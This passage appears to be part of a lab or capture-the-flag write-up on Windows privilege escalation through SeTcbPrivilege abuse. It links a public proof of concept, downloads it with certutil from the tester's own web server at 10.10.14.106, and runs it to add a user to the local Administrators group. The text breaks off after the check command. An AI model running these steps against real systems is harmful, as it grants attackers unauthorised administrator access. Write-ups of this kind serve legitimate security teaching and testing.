SeTcbPrivilege (Act as part of the operating system) is a highly privileged Windows privilege that allows processes to act on behalf of users and manipulate security tokens. We can leverage it using the following PoC: https://github.com/b4lisong/SeTcbPrivilege-Abuse

Downloading the PoC from our web server:
```powershell
certutil -urlcache -split -f http://10.10.14.106:8001/TcbElevation-x64.exe C:\xampp\htdocs\TcbElevation.exe
```

TcbElevation.exe supports spawning a process directly under the elevated token, which could be used to launch an nt authority reverse shell via msfvenom. In this case we'll opt for a simpler local admin group route instead:
```shell
.\TcbElevation.exe elevate 'net localgroup Administrators enox /add'

PS C:\xampp\htdocs> net localgroup Administrators
